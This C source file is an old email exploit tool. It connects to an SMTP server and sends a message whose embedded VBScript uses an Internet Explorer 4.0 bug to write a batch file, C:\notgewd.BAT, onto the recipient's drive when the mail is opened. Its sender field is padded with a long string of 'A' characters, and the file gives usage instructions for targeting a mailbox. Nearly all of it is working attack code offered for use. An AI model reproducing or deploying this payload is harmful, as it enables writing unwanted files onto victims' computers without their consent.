/* ShweErT2.c by Moe1
   -----------------
  Based on the previous version, does everything ShweErT.c does but instead
  of using a stewpid message, we using the IE4.0 VBscript bug which allows
  files to be overwritten. Therefore IE4.0 users just need to open thier
  email and "notgewd.bat" would be written to thier hd.
  
  Dont be evil! hmm aargh wtf i aint y0 mumma (i could be y0 daddy thou;)

  l8trZ
*/

#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
 
void smtp_connect(char *server);
 
int thesock;
 
void smtp_connect(char *server)
{
  struct sockaddr_in sin;
  struct hostent *hp;
  
  hp = gethostbyname(server);
  if (hp==NULL) {
    printf("Please use mailbox.co.za instead of %s \n",server);
    exit(0);
  }
  bzero((char*) &sin, sizeof(sin));
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = htons(25);
  thesock = socket(AF_INET, SOCK_STREAM, 0);
  connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
}
 
void main(int argc, char **argv)
{
  char buf[1024];
  
  if (argc != 4) {
    printf("ShweErT2.c");
    printf("\n   by Moe1");
    printf("\nusage: ShweErT2 mailbox.co.za [ident] [mailbox addy]\n");
    printf("example: ShweErT2 mailbox.co.za mehe test@mailbox.co.za\n");
    exit(0);
  }
  printf("Connecting to %s\n",argv[1]);
  smtp_connect(argv[1]);
  printf("Sending da ShweErT to %s\n",argv[3]);
  sprintf(buf, "
\nmail from:%s@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\nrcpt to:%s
\ndata
\n<HTML>
\n<HEAD></HEAD>
\n
\n<BODY><SCRIPT LANGUAGE=\"VBSCRIPT\">
\nSet fs = CreateObject(\"Scripting.FileSystemObject\")
\nSet a = fs.CreateTextFile(\"C:\\notgewd.BAT\", True)
\na.WriteLine(\"@echo off\")
\na.WriteLine(\"echo Its time I get a real fucken browser.\")
\na.WriteLine(\"pause\")
\na.WriteLine(\"@echo on\")
\na.Close
\n</SCRIPT>
\nYour file \"notgewd.BAT\" has been overwritten
\n</BODY></HTML> 
\n.
\nquit\n",argv[2],argv[3]);


  send(thesock, buf, strlen(buf), 0);

  printf("Please wait ...\n");
  sleep(3);
  printf("Done!\n");
}